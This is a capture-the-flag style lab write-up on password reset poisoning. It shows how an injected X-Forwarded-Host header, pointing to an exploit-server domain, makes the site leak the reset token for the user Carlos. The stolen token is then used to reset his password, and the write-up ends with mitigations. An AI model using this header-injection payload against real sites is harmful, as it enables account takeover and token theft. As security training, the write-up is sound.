# Lab Name
Password reset poisoning via middleware

## Vulnerability
Authentication Vulnerability – Password Reset Poisoning

## Objective
Gain access to Carlos's account by poisoning the password reset link.

## Entry Point
Forgot password functionality

## Exploitation Type
Header Injection / Host Header Poisoning

## Methodology
1. Login using provided credentials:
   wiener:peter

2. Click on "Forgot Password" and submit request for user:
   wiener

3. Intercept the password reset request and send it to Repeater

<img width="1923" height="985" alt="1" src="https://github.com/user-attachments/assets/47e1340c-2cec-4898-bf0d-c6924e0e745f" />

4. Modify the request:
   - Change username from wiener to carlos
   - Add header:
     X-Forwarded-Host: exploit-0a4500f203b887f080ee2502019500bc.exploit-server.net

     <img width="1487" height="897" alt="1 1" src="https://github.com/user-attachments/assets/8af282c4-fcc1-4bd4-9c92-876c38487415" />

5. Send the modified request

6. The application sends a password reset link to carlos containing the poisoned host

7. Go to the exploit server and check incoming requests/logs

8. Capture the password reset token from the request made by carlos

<img width="1867" height="960" alt="1 2" src="https://github.com/user-attachments/assets/eb55fbd5-ab73-4a17-a7d8-5b85f38e2571" />

9. Now perform a normal password reset for wiener and intercept the request

<img width="1857" height="965" alt="1 3" src="https://github.com/user-attachments/assets/ee99b736-c716-498c-b539-52933e761714" />

10. Replace the reset token in the request with the stolen token of carlos

<img width="1487" height="840" alt="1 4" src="https://github.com/user-attachments/assets/5e2808da-fde0-4c0f-866c-0022bc7d3bdd" />

11. Set a new password and send the request

12. Password for carlos is successfully changed

13. Login using:
   username: carlos
   password: xyz

## Payload Used

Header:
X-Forwarded-Host: exploit-0a4500f203b887f080ee2502019500bc.exploit-server.net

## Result
Successfully poisoned the password reset link, captured Carlos's reset token, and reset his password to gain account access.

## Impact
- Unauthorized password reset
- Full account takeover
- Sensitive token leakage
- Critical authentication vulnerability

## Mitigation
- Do not trust user-controlled headers like X-Forwarded-Host
- Validate and sanitize host headers
- Generate absolute URLs securely on the server side
- Bind reset tokens to specific users and sessions
- Expire tokens after single use

## Learning
Improper handling of host headers can lead to password reset poisoning.
Applications must validate all user-controlled inputs, including headers, to prevent account takeover.
